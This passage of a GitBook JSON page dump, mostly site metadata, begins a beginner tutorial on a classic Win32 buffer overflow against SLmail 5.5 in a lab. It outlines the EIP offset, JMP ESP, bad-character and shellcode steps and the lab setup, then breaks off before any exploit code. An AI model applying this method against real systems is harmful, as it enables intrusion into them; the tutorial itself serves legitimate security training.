basics","path":"windows-basics","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LVeEAIDIEz99vOToKtF%2Fmaster%2F-LO-XNCqRqXP8qFY4rTS%2Fdocument.json?alt=media\u0026token=4b930a0f-500e-4161-90e1-33c6f068565d","createdAt":1538681045877,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1546896888058,"updatedAt":1546896888058,"count":1}},"github":{"sha":"b931e152a9cebdc07626b655a3bcdd25aab6cbd2","filePath":"windows-basics.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LMxqx4puMNL-q-mc1EM":{"uid":"-LMxqx4puMNL-q-mc1EM","kind":"document","title":"Learning resources","path":"learning-resources","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LjvgQu6puwKuKTBBIc8%2Fmaster%2F-LMxqx4puMNL-q-mc1EM%2Fdocument.json?alt=media\u0026token=76e59aa3-3bc9-4e8e-b9e7-cc5b67f26883","createdAt":1537562366314,"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1563295934456,"updatedAt":1563295934456,"count":1}},"github":{"sha":"98f470c53c20b21747dcabd89abcb0a1626bb949","filePath":"learning-resources.md"},"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":null}}}},"assets":{"-LT9dMGb2T6qC5vmFqI4":{"uid":"-LT9dMGb2T6qC5vmFqI4","name":"Screen Shot 2018-12-07 at 4.48.19 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LT9cq4NUbSMy1maN4eG%2F-LT9dMGb2T6qC5vmFqI4%2FScreen%20Shot%202018-12-07%20at%204.48.19%20PM.png?alt=media\u0026token=103bed98-7f31-4d6a-b636-e0d9f7fab081","size":68474,"contentType":"image/png","createdAt":1544471512818,"github":{"sha":"764d0fee99e7b2608c3c874b73b1b47e23d7e959","filePath":".gitbook/assets/screen-shot-2018-12-07-at-4.48.19-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544471512818,"updatedAt":1575998817531,"count":37}}},"-LTP9YwBmkabKGx_Gudt":{"uid":"-LTP9YwBmkabKGx_Gudt","name":"Screen Shot 2018-12-10 at 5.08.22 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTP7kkhbeWw906w8nP0%2F-LTP9YwBmkabKGx_Gudt%2FScreen%20Shot%202018-12-10%20at%205.08.22%20PM.png?alt=media\u0026token=08c91a50-b44b-4e00-8ca3-5718dac620c3","size":69644,"contentType":"image/png","createdAt":1544480870700,"github":{"sha":"7e09abe20db4d95efc6f6ee8c69d78802880e001","filePath":".gitbook/assets/screen-shot-2018-12-10-at-5.08.22-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544480870700,"updatedAt":1575998817531,"count":37}}},"-LTik0qYbS-NSyYSlOcU":{"uid":"-LTik0qYbS-NSyYSlOcU","name":"Screen Shot 2018-12-06 at 3.31.32 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTifrrMvFn8k3ViZNTa%2F-LTik0qYbS-NSyYSlOcU%2FScreen%20Shot%202018-12-06%20at%203.31.32%20PM.png?alt=media\u0026token=bd98f277-b061-48b7-9f51-49a3a625f176","size":57931,"contentType":"image/png","createdAt":1544825632242,"github":{"sha":"9dc06a30e435f4007b0ad9fa7a88f4c46686e8a9","filePath":".gitbook/assets/screen-shot-2018-12-06-at-3.31.32-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544825632242,"updatedAt":1575998817532,"count":37}}},"-LTijwn-h291c1u2y0mu":{"uid":"-LTijwn-h291c1u2y0mu","name":"Screen Shot 2018-12-06 at 3.31.32 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTifrrMvFn8k3ViZNTa%2F-LTijwn-h291c1u2y0mu%2FScreen%20Shot%202018-12-06%20at%203.31.32%20PM.png?alt=media\u0026token=8c9afd18-32a2-42db-9616-d56a6bb08d7c","size":57931,"contentType":"image/png","createdAt":1544825632061,"github":{"sha":"9dc06a30e435f4007b0ad9fa7a88f4c46686e8a9","filePath":".gitbook/assets/screen-shot-2018-12-06-at-3.31.32-pm (1).png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544825632061,"updatedAt":1575998817532,"count":37}}},"-LTYmN7Gy_M-eOaZ04XD":{"uid":"-LTYmN7Gy_M-eOaZ04XD","name":"dump.jpg","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTYT_zvZqSJHJhAma7D%2F-LTYmN7Gy_M-eOaZ04XD%2Fdump.jpg?alt=media\u0026token=7381db07-b748-4f39-b37d-2cbeed5dcb6d","size":196780,"contentType":"image/jpeg","createdAt":1544642434734,"github":{"sha":"15659457a764f8f4dc59225f8caf3d99aed4aec8","filePath":".gitbook/assets/dump.jpg"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544642434734,"updatedAt":1575998817532,"count":37}}},"-LTYrBNq57LM9XWavXjT":{"uid":"-LTYrBNq57LM9XWavXjT","name":"dump2.jpg","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTYT_zvZqSJHJhAma7D%2F-LTYrBNq57LM9XWavXjT%2Fdump2.jpg?alt=media\u0026token=6565b5e2-0f92-49a9-8c6b-4223f97a0f9d","size":272032,"contentType":"image/jpeg","createdAt":1544642436827,"github":{"sha":"c8479ef374b0dde4a424fd7c78ea5985726c0f1c","filePath":".gitbook/assets/dump2.jpg"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544642436827,"updatedAt":1575998817533,"count":37}}},"-LTYtbuTMhfSsxCCuSBv":{"uid":"-LTYtbuTMhfSsxCCuSBv","name":"Screen Shot 2018-12-12 at 2.29.49 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTYrUWeMvHBcDUz1QGd%2F-LTYtbuTMhfSsxCCuSBv%2FScreen%20Shot%202018-12-12%20at%202.29.49%20PM.png?alt=media\u0026token=d5b99445-92ae-4749-8d76-819d89635231","size":25864,"contentType":"image/png","createdAt":1544643529149,"github":{"sha":"b9dd051476be959db7a0097d5d4a8b4264279b0e","filePath":".gitbook/assets/screen-shot-2018-12-12-at-2.29.49-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544643529149,"updatedAt":1575998817533,"count":37}}},"-LTieU6Am0mzIIiE6AZj":{"uid":"-LTieU6Am0mzIIiE6AZj","name":"Screen Shot 2018-12-06 at 3.12.16 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTidfj5788QmC3_L_ce%2F-LTieU6Am0mzIIiE6AZj%2FScreen%20Shot%202018-12-06%20at%203.12.16%20PM.png?alt=media\u0026token=133d0843-a161-4e16-97f9-feca334409a4","size":113238,"contentType":"image/png","createdAt":1544823818359,"github":{"sha":"8aae6a49ec184dc05a87d79eed98395a7269eb78","filePath":".gitbook/assets/screen-shot-2018-12-06-at-3.12.16-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544823818359,"updatedAt":1575998817534,"count":37}}},"-LT9UVgfWuGk9QWpiKQ2":{"uid":"-LT9UVgfWuGk9QWpiKQ2","name":"Screen Shot 2018-12-07 at 4.05.58 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LT9P20j1hA2J6rT47xo%2F-LT9UVgfWuGk9QWpiKQ2%2FScreen%20Shot%202018-12-07%20at%204.05.58%20PM.png?alt=media\u0026token=443bbdf1-dad7-45e7-b2dd-c4c08e6f7cd6","size":57129,"contentType":"image/png","createdAt":1544219097869,"github":{"sha":"91bcc74b563dd4ab0855703cd1c17dd57a5985a7","filePath":".gitbook/assets/screen-shot-2018-12-07-at-4.05.58-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1544219097869,"updatedAt":1575998817534,"count":37}}},"-LTy6h5PM8kC1O7NPz4_":{"uid":"-LTy6h5PM8kC1O7NPz4_","name":"Screen Shot 2018-12-17 at 4.41.53 PM.png","downloadURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTy4mJZ1obv8guGsBqk%2F-LTy6h5PM8kC1O7NPz4_%2FScreen%20Shot%202018-12-17%20at%204.41.53%20PM.png?alt=media\u0026token=33f849e0-6d0a-4b36-9148-ce95511fc3b5","size":25182,"contentType":"image/png","createdAt":1545083657262,"github":{"sha":"515bd4b2d23b81e02b2ec2f8292eed3415e63ea2","filePath":".gitbook/assets/screen-shot-2018-12-17-at-4.41.53-pm.png"},"edits":{"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92":{"createdAt":1545083657262,"updatedAt":1575998817534,"count":37}}}}},"github":[{"repoID":"vulp3cula/hackers-grimoire","sha":"f0fcb677c7aee1776eb6505e62254bb974b1401e","ref":null,"message":"GitBook: [master] one page modified","isGitBookBot":true}],"rollbackOf":null}},"embeds/https:%2F%2Fwww%2Eyoutube%2Ecom%2Fwatch?v=1S0aBV-Waeo":{"kind":"embed","data":{"url":"https://www.youtube.com/watch?v=1S0aBV-Waeo","updatedAt":1557423669559,"data":{"html":"\u003cdiv\u003e\u003cdiv style=\"left: 0; width: 100%; height: 0; position: relative; padding-bottom: 56.2493%;\"\u003e\u003ciframe src=\"https://cdn.iframe.ly/api/iframe?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D1S0aBV-Waeo\u0026amp;key=4fb668ebc74b721f3c2230d81634c8bc\" style=\"border: 0; top: 0; left: 0; width: 100%; height: 100%; position: absolute;\" allowfullscreen scrolling=\"no\" allow=\"autoplay; encrypted-media\"\u003e\u003c/iframe\u003e\u003c/div\u003e\u003c/div\u003e","type":"rich","url":"https://www.youtube.com/watch?v=1S0aBV-Waeo"},"outdated":true}},"orgs/Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92/infos":{"kind":"user","data":{"kind":"user","uid":"Jk5MaAwrtfSG2ELJrJ8ZmFMH7n92","baseDomain":"vulpecula","defaultSpace":null,"displayName":"vulpecula","photoURL":"https://avatars3.githubusercontent.com/u/6218175?v=4","deletedAt":null,"usageStatuses":{"members":"below","privateSpaces":"below","publicSpaces":"below"}}}},"documents":{"documents":{"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LMNRaGfniDGOexfu2Y6%2F-LTyDQVL43tYdAzVAO4a%2Fmaster%2F-LT8Ks-3SRru8S9Qhb0b%2Fdocument.json?alt=media\u0026token=aa4a343a-b458-4a9e-aa3d-fbbb606c6e46":{"format_version":1,"document":{"kind":"document","key":"2ee161b522ca4f3b8e19dc346281fa08","data":{"schema_version":6},"nodes":[{"kind":"block","type":"paragraph","key":"378bff90ef1142759026480e80481692","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0ae09c44c00949eea3a859824db4c778","ranges":[{"kind":"range","marks":[],"text":"Pulling off a classical Win32 buffer overflow is a lot like baking a fancy cake. The "}]},{"kind":"inline","type":"link","key":"c4e25f372f1b42b4a369a9c13d0af6d3","isVoid":false,"data":{"href":"https://www.foodnetwork.ca/recipe/raspberry-mascarpone-black-forest-cake/15205/"},"nodes":[{"kind":"text","key":"0b2a62803d9a447a8af1de9559e4c70f","ranges":[{"kind":"range","marks":[],"text":"cake recipe"}]}]},{"kind":"text","key":"2daf41c95f5443cc906f8e21fe5e9965","ranges":[{"kind":"range","marks":[],"text":" is actually a bunch of smaller recipes for the topping, the icing, the layers and the filling. If you don't get each mini-recipe right, the cake will suck."}]}]},{"kind":"block","type":"paragraph","key":"7ba73266768d4754aac9663069f6ee1f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7f8239c640ec4f9ca3ce0347e183a92b","ranges":[{"kind":"range","marks":[],"text":"Similarly, a buffer overflow recipe has the following mini-recipes:"}]}]},{"kind":"block","type":"paragraph","key":"59cb40f7a341403c90d9559b68df4628","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"149f2165fadd42a38b3694072057d7e2","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"Find the instruction pointer"}]}]},{"kind":"block","type":"list-unordered","key":"316c761ebc344eec8e8506faa143c1a5","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"3b09f0721c1746b9bb6535b519830932","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"a9ec0a400dba4d859b1821ff45c8524d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4783d65a4cf546a1863f319875e52657","ranges":[{"kind":"range","marks":[],"text":"Make a simple script to shove a bunch of garbage into an input field and crash the program"}]}]}]},{"kind":"block","type":"list-item","key":"77007a65a6254bc79cfe35259faf43d7","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"ba2c02a55d3941bd8e9023e8ce0f1e95","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"cb1bac4ced4d4faa8f92eff72474e611","ranges":[{"kind":"range","marks":[],"text":"Find the exact number of characters required to reach the EIP (instruction pointer)"}]}]}]}]},{"kind":"block","type":"paragraph","key":"0f763f65e4b7478f929f7b3b8d4199c9","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"2e9b4eb35c6a46c3a76df0458e453e44","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"Redirect execution of the program"}]}]},{"kind":"block","type":"list-unordered","key":"d07d3a83880e4401920f88e0a85d783b","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"5ed42d1afb394fa0a371d822ffad641f","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"fe0c8d9448894e54bd24391070fb4c2f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8657c24c802641f0b96c36f6c693d5a6","ranges":[{"kind":"range","marks":[],"text":"Inspect the program's .dll files to find one without memory protections "}]}]}]},{"kind":"block","type":"list-item","key":"20a16c95f5704bf093f6ae25959a47b5","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"a5a9676c5e9644ce85f666ef6c1723a7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"30265239f4ee45459be3dd708034e9ae","ranges":[{"kind":"range","marks":[],"text":"Once you've found a suitable .dll, search for a "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"JMP ESP"},{"kind":"range","marks":[],"text":" (jump to the stack pointer) command"}]}]}]},{"kind":"block","type":"list-item","key":"dfb0d5e5983e4831b7721ac6d6ae283b","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"108cbf8d766241d59b170efb7e8af907","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8dabf76d83b04a2b9fd819e2206dfbdd","ranges":[{"kind":"range","marks":[],"text":"Record the memory address for this command"}]}]}]}]},{"kind":"block","type":"paragraph","key":"327fa0dce3d34b55995685e791597ba6","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"66e81fe7fae14b86a7b8b1ec41835eef","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"Make shellcode"}]}]},{"kind":"block","type":"list-unordered","key":"afeb788fc4e34a4d883ea323d761b690","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"4de712379a2d4972aca97af514f6fd60","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"d9583cf89be44c4cbbc4605d8776dc3b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0b018b376bd1480080e51be596d48351","ranges":[{"kind":"range","marks":[],"text":"Find the 'bad' characters that will prevent your exploit from working"}]}]}]},{"kind":"block","type":"list-item","key":"de35e1f13adc41b7b00dfbf0112c5798","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"6f8b67e3aa8d4f18a9a65d3a9f57d509","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"bd0c075635f9476d863b41eb88cbdb0a","ranges":[{"kind":"range","marks":[],"text":"Generate shellcode without bad characters"}]}]}]}]},{"kind":"block","type":"paragraph","key":"2850d5fd61024a74a96756a7e884d90a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"0058395224184fd796fa31cfa8454391","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"Assemble the exploit"}]}]},{"kind":"block","type":"list-unordered","key":"5a5edc03e9f64d3bada3b32f25c41faf","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"2fd6902f77304300afe02668f7e134d4","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"4068110b1389435fac8558e0f7509ebe","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"e55f05be825042c59f00291a44550ba6","ranges":[{"kind":"range","marks":[],"text":"Update your simple script to hit the EIP, jump to the ESP and execute your shellcode"}]}]}]},{"kind":"block","type":"list-item","key":"886bc71068d945a0b55c6db6cd093286","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"4cc016cc20ee478faba662a44663a51e","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"39536193f98443c8bda70c8c4636276d","ranges":[{"kind":"range","marks":[],"text":"Throw in a few nops for breathing room"}]}]}]},{"kind":"block","type":"list-item","key":"263028202a9b4cd5839d6a11dafa58c5","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"99a50217968f4e928ff1492b55dafa17","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"86ce920dd180455f86b33a129865a635","ranges":[{"kind":"range","marks":[],"text":"Don't forget to put the "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"JMP ESP"},{"kind":"range","marks":[],"text":" memory address in backwards!"}]}]}]}]},{"kind":"block","type":"paragraph","key":"bf2fe874333b4939a5e90196f3b26beb","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d84628e2f5d940d7a115728a25b64fa2","ranges":[{"kind":"range","marks":[],"text":"If you haven't done this before, many of the terms above will be unfamiliar, but don't worry. You can do simple buffer overflows without knowing much about Assembly or memory layout, and you'll learn a lot along the way. I spent far too much time reading about those things and freaking myself out. All you need to get started is in the video below."}]}]},{"kind":"block","type":"embed","key":"15ebabc5f2e947868fa790aedf4e5b8e","isVoid":true,"data":{"url":"https://www.youtube.com/watch?v=1S0aBV-Waeo"},"nodes":[{"kind":"text","key":"b10de34142bc438681c71635acae2fff","ranges":[{"kind":"range","marks":[],"text":""}]}]},{"kind":"block","type":"heading-1","key":"fb9c606422694fabb4edd850ff62bb5f","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"2def7ff134a449e0b928b1e654bdb1ac","ranges":[{"kind":"range","marks":[],"text":"Setup"}]}]},{"kind":"block","type":"paragraph","key":"20840828af2c4b7a8d2a5ef6b424088b","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"40c58cc57a45411497c71183d033852b","ranges":[{"kind":"range","marks":[],"text":"If you're signed up for "}]},{"kind":"inline","type":"link","key":"c73d63c9deab44cf9bdf9f78e7e29cb3","isVoid":false,"data":{"href":"https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/"},"nodes":[{"kind":"text","key":"0cb8e40c971f4b5b955c72380c213a37","ranges":[{"kind":"range","marks":[],"text":"PWK-OSCP"}]}]},{"kind":"text","key":"f2c6ff1eb35e4ed98a9dbc3e38abe77e","ranges":[{"kind":"range","marks":[],"text":", you'll get a Windows 7 lab machine with tools installed to practice buffer overflows. It's also pretty easy to set up yourself if you can run 2 virtual machines (Kali and Windows) or run a Windows VM on a native Kali machine. In all cases, the Kali machine needs to be able to reach the Windows machine over the network."}]}]},{"kind":"block","type":"list-ordered","key":"409d7804435849908c0b585b5a51fbb9","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"45751517dabd4125b84b78327ad3863a","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"37d042bdf402407c8f94ace5dc7aef8d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"200a7ce761d94f79ab8e86bbe30ddd7e","ranges":[{"kind":"range","marks":[],"text":"Download and install a "}]},{"kind":"inline","type":"link","key":"2927c6542c5f4d16abdc50472b080868","isVoid":false,"data":{"href":"https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/"},"nodes":[{"kind":"text","key":"f0c5b06a65334032ad6e0f2f8d46bf80","ranges":[{"kind":"range","marks":[],"text":"Windows 7 virtual machine"}]}]},{"kind":"text","key":"291d7f4748354d7e881cb37263a97e81","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"71da279efbe54ad4be83abe66e5b23c8","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"8b60dee7385e4e609d656ebb4b53f23d","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"7bf12db008814c678bf7b8abadb67575","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"bold"}],"text":"Turn off Windows Firewall"}]}]}]},{"kind":"block","type":"list-item","key":"14b4e4eda1c4451bb1e09ad6f2123cd5","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"024ac913e4514a46ae12ff8b3e60cecb","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f4a8d41df28d4fc8bfe446bef021b16b","ranges":[{"kind":"range","marks":[],"text":"Download and install:"}]}]},{"kind":"block","type":"list-unordered","key":"91d595f50db94837acbca742c1c9df64","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"list-item","key":"dab1864fe33c426bbbd6b56bf6cf69f4","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"1fef59a763b04606951c16a92e406090","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"cd6cbfd6f1344b07ae47556a1792a2cb","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"7758cc0f3952471cabd4a407508d8326","isVoid":false,"data":{"href":"https://www.google.com/chrome/"},"nodes":[{"kind":"text","key":"0e1ea6e79a594fa8aacab4525cc3f177","ranges":[{"kind":"range","marks":[],"text":"Chrome"}]}]},{"kind":"text","key":"7ef8b003c76140718cb2401e18255e95","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"4adb2d8caae94eda8cef5e36d1e47325","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"85e5eb8e0e9441f083d9a6292d1249dd","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"22e378becf294e15bbd37d389157fa8e","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"b60ea595b0da4343a3a379b5a3a8d662","isVoid":false,"data":{"href":"https://eternallybored.org/misc/netcat/"},"nodes":[{"kind":"text","key":"6c2224763f674c7dbd43417653814890","ranges":[{"kind":"range","marks":[],"text":"Netcat"}]}]},{"kind":"text","key":"8f29944bddfd40ddb89501aee7482bbc","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"adc64726277444d1a1ec0a63c1686114","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"57c102e12d3846f981b19a0f3f521664","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"8c1713df40614b3d94c9339deb32bbd5","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"da9f6b574f7a467c9c4e1ef3c1e50ad4","isVoid":false,"data":{"href":"https://www.immunityinc.com/products/debugger/index.html"},"nodes":[{"kind":"text","key":"73b533fc96144c1a8f6d7b86d4e73a88","ranges":[{"kind":"range","marks":[],"text":"Immunity Debugger"}]}]},{"kind":"text","key":"871d071304f948999c977db9ec51d1ac","ranges":[{"kind":"range","marks":[],"text":""}]}]}]},{"kind":"block","type":"list-item","key":"a30190181e9b4773a84a69928fe02172","isVoid":false,"data":{},"nodes":[{"kind":"block","type":"paragraph","key":"bec317c8979c4113b870c723387f6469","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1fe88e7d421c428cbb2c8c0d59446844","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"b8b6c1affee44964a4a8a7317d65b87f","isVoid":false,"data":{"href":"https://github.com/corelan/mona"},"nodes":[{"kind":"text","key":"81c3c7da7e3740f9bb95bfd5ed8357fe","ranges":[{"kind":"range","marks":[],"text":"Mona.py"}]}]},{"kind":"text","key":"d4544a65e13b4c9f9c4b29a31ba5f9ed","ranges":[{"kind":"range","marks":[],"text":""}]}]}]}]}]}]},{"kind":"block","type":"paragraph","key":"2565952b337a47e2ad909a14db7b93f8","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1ca95fb8d52d4cebb422edd4d1dc0f44","ranges":[{"kind":"range","marks":[],"text":"At this point, you'll want to snapshot your VM so that you can revert back if your Windows trial expires or you blow up the whole operating system somehow."}]}]},{"kind":"block","type":"heading-1","key":"a80ac79892ca476da91af17fb09b62a7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"b38c57b108bb4158a2ee9bfae9892676","ranges":[{"kind":"range","marks":[],"text":"SLmail 5.5"}]}]},{"kind":"block","type":"paragraph","key":"0dbcd9aed00a495e8252520d36840dd2","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"4409291052e647c8bd66ebbf4b9ada79","ranges":[{"kind":"range","marks":[],"text":"SLmail is one of the classic examples for teaching buffer overflows. There are lots of walkthroughs online, but many concepts aren't fully explained. This walkthrough is for all the ultranoobs like me who don't know much about debuggers, hex, ASCII, python, etc."}]}]},{"kind":"block","type":"heading-2","key":"03b62bc0d45646ee864c80e3bd3717b4","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"dd8ae27f5e7e4085b32f2640133e4eb8","ranges":[{"kind":"range","marks":[],"text":"Install SLmail"}]}]},{"kind":"block","type":"paragraph","key":"3bb3e4ced24a4ce3add94cf6c27bceaa","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"d4801e701c9649ea86be2943eaa0bc36","ranges":[{"kind":"range","marks":[],"text":""}]},{"kind":"inline","type":"link","key":"1afc90b2607744dfa42cdca90bb01306","isVoid":false,"data":{"href":"https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe"},"nodes":[{"kind":"text","key":"e0524e14320140e3929c42d799c5b6dc","ranges":[{"kind":"range","marks":[],"text":"Download it from Exploit-DB"}]}]},{"kind":"text","key":"6b55647e893b472883d2ac8a9b84787f","ranges":[{"kind":"range","marks":[],"text":" and install with defaults (just keep hitting Next). Since you'll be attacking the POP server on port 110, you should check if it's open and reachable. You can do this by connecting to it from your Windows netcat program:"}]}]},{"kind":"block","type":"paragraph","key":"34541ce19e3f41928c6c9be0e28692de","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"347d4c37c4b24f8e9c5d4f960be6b9da","ranges":[{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":" nc [Windows IP] 110"}]}]},{"kind":"block","type":"paragraph","key":"cef7601c2f0d4771916321e9791e90f3","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"719119d7a9bb4f52ad45aa0ec35f7aa4","ranges":[{"kind":"range","marks":[],"text":"You can also confirm the POP3 service is running with a quick nmap scan from your Kali machine. This becomes important when you run the debugger and crash the program - you can restart it if you have some kind of service manager (like XAMMP Control Panel), but if you just click on "},{"kind":"range","marks":[{"kind":"mark","data":{},"type":"code"}],"text":"SLMail.exe"},{"kind":"range","marks":[],"text":" the port may not show up unless you restart Windows. Checking that the POP3 service is up will save you a lot of headaches during exploitation."}]}]},{"kind":"block","type":"heading-2","key":"925e00878a15490bad176184b3b10209","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"1662e452a97648f7a7f0594af9f8f16e","ranges":[{"kind":"range","marks":[],"text":"Find the instruction pointer"}]}]},{"kind":"block","type":"paragraph","key":"c45972852722478682385dcbd689dfa7","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"a9253ccdaa8640f99145a22a546ebf7e","ranges":[{"kind":"range","marks":[],"text":"The first step is to crash the program by submitting an overly-long password during login, and watching what happens in Immunity Debugger."}]}]},{"kind":"block","type":"paragraph","key":"17b20cf4e88d407f8d8322a39ea0593a","isVoid":false,"data":{},"nodes":[{"kind":"text","key":"f890236b59b646bf87d1783d3cba7f01","ranges":[{"kind":"range","marks":[],"text":"Create a small python script that will repeatedly log into the mail server and submit long strings of characters for the 